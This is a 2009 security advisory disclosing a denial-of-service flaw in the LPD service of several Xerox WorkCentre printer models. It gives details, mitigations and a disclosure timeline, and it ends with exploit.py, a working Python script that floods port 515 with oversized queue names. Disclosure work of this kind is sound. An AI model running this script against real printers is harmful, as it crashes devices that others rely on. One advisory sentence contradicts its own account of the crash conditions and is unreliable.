@@ -1,0 +1,183 @@
+#           Louhi Networks Information Security Research
+#                        Security Advisory
+# 
+# 
+#      Advisory: Xerox WorkCentre multiple models Denial of Service
+#  Release Date: 2009/08/25
+# Last Modified: 2009/08/25
+#       Authors: Juho Ranta
+#                [juho.ranta@louhi.fi]
+#                Henri Lindberg, CISA
+#                [henri.lindberg@louhi.fi]
+# 
+#   Application: Xerox WorkCentre
+#      Verified: Controller+PS ROM Version 1.202.1 and 1.202.5
+#       Devices: Xerox WorkCentre 7132,
+# 	       WC7232/7242, WC7328/7335/7345/7346 and
+#                WC7425/28/35
+#   Attack type: Denial of Service
+#          Risk: Low
+# Vendor Status: Patch available for WC7232/7242
+#    References: http://www.louhinetworks.fi/advisory/xerox_0908.txt
+# 
+# http://www.cert.fi/haavoittuvuudet/2009/haavoittuvuus-2009-081.html
+# 
+# http://www.support.xerox.com/go/results.asp?Xtype=download&prodID=WC7232_WC7242&Xlang=en_US&Xcntry=USA
+# 
+# 
+# Overview
+# 
+#    Quote from http://www.xerox.com/
+#    "The Xerox WorkCentre 7132 multifunction is the affordable transition
+#     to the next level of productivity for your office. One easy-to-use
+#     device offers powerful printing, copying, scanning, and faxing. The
+#     WorkCentre 7132 also gives you color when you need it, for critical
+#     documents and for added impact. Robust functions, straightforward
+#     operation, and color within your budget . that should keep everyone
+#     smiling and productive."
+# 
+#     During a brief assessment performed for Xerox WorkCentre 7132 it was
+#     discovered that LPD daemon implementation contains a weakness
+#     related  to robustness of LPD protocol handling. Attacker can crash
+#     the whole device with a relatively simple attack. Recovering from
+#     the denial-of-service condition requires power cycling the device.
+# 
+# Details
+# 
+#     Device freezes when it is flooded with LPD requests having oversized
+#     queue name length AND other features of the device are accessed
+#     during the attack.
+# 
+#     The LPD daemon terminates the connection when it receives a request
+#     with an oversized queue name. The required minimum length for this
+#     seems to vary. Our proof-of-concept attack sends ASCII character
+#     blocks to the LPD daemon until connection is closed, while sending
+#     HTTP requests to the web administration interface.
+# 
+#     By flooding the device with these invalid LPD requests and accessing
+#     other features at the same time, the device can be crashed. This was
+#     verified with two different firmware versions (1.202.1 and 1.202.5).
+# 
+#     It must be noted that successful denial-of-service attack requires
+#     the steps described above. Sending requests with oversized queue
+#     names does crash the device by itself.
+# 
+#     Due to the black box nature of the performed attack against a
+#     production device, we were not able to determine the exact root
+#     cause for the crash. According to vendor this is caused by a memory
+#     leak, but further exploitability or memory corruption has neither
+#     been confirmed nor denied.
+# 
+#     Vulnerability was detected with an LPD protocol implementation
+#     written for Sulley Fuzzing Framework.
+# 
+# 
+# Preconditions
+# 
+#     *LPD daemon is enabled.
+#     *Attacker has network access to the LPD daemon
+#     *Attacker has network access to other features OR
+#     *Valid user uses the device on location
+# 
+# 
+# Symptoms of successful attack
+# 
+#     One or more of the following:
+#      *Control panel lights are blinking, no response to pushing buttons
+#      *LCD panel displays error message
+#      *LCD panel displays a halted progress bar
+#      *Switching power off from on/off button takes more than 10 seconds
+# 
+# Proof of Concept:
+# 
+#     Python code available at:
+#     http://www.louhinetworks.fi/advisory/xerox/exploit.py
+#     http://www.louhinetworks.fi/advisory/xerox/webInterface.py
+# 
+#     Pictures of a crashed control panel (Finnish language):
+#     http://www.louhinetworks.fi/advisory/xerox/error1.jpg
+#     http://www.louhinetworks.fi/advisory/xerox/freeze1.jpg
+# 
+#     Web interface requests are performed with a separate Python
+#     process/script in order to achieve more reliable exploitation under
+#     Windows.
+# 
+# Mitigation:
+# 
+#     Preventive
+#      *Install patch from vendor
+#      *Configure IPS signature for LPD requests with oversized queue
+#       names
+#      *Allow only trusted users to access LPD daemon
+#      *Disable LPD daemon
+# 
+#     Detective
+#      *Configure IDS signature for LPD requests with oversized queue
+#       names
+# 
+# Disclosure Timeline (selected dates):
+# 
+#        X         2008    - Vulnerability discovered
+#    3.  September 2008    - Contacted CERT-FI by email describing the
+#                            issue with Xerox WC 7132
+#    20. November  2008    - CERT-FI confirms vendor has been notified
+#    21. January   2009    - Vendor is unable to reproduce the issue,
+#                            but continues trying
+#    22. January   2009    - Vulnerability reproduced, vendor investigates
+#                            other devices. Apologizes slow response.
+#    17. June      2009    - Vendor has identified vulnerable devices,
+#                            patch due in July.
+#    20. August    2009    - Patch available for download (only
+#                            WC7232/7242)
+#    25. August    2009    - Advisory released
+# 
+# A Big Thank You to CERT-FI's Vulnerability Coordination for persistent
+# coordination effort.
+# 
+# Copyright 2009 Louhi Networks Oy. All rights reserved. No warranties,
+# no liabilities, information provided 'as is' for educational purposes.
+# Reproduction allowed as long as credit is given. Information wants to
+# be free.
+
+import socket
+import sys
+import os
+import httplib
+import signal
+
+if len(sys.argv) < 2:
+    print("Usage: python exploit.py printerIpAddress")
+    print("After the script is started, execute the webInterface.py script")
+    sys.exit(0)
+
+ipAddress = sys.argv[1]
+
+
+i = 0
+
+while True:
+    i += 1
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ipAddress, 515))
+
+    except:
+        # If the connection fails, printer has crashed
+        print("Unable to connect")
+        sys.exit(0)
+
+    # Send receive a printer job -command. Queue name will be as long as
+    # possible. The printer will disconnect when the queue name has reached it's
+    # maximum length
+    s.send("\x02")
+    j = 0
+    while True:
+        j += 1
+        s.send("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
+        print(str(i) + "." + str(j))
+        
+    s.close()
+
+    print(i)
+
+# milw0rm.com [2009-08-25]
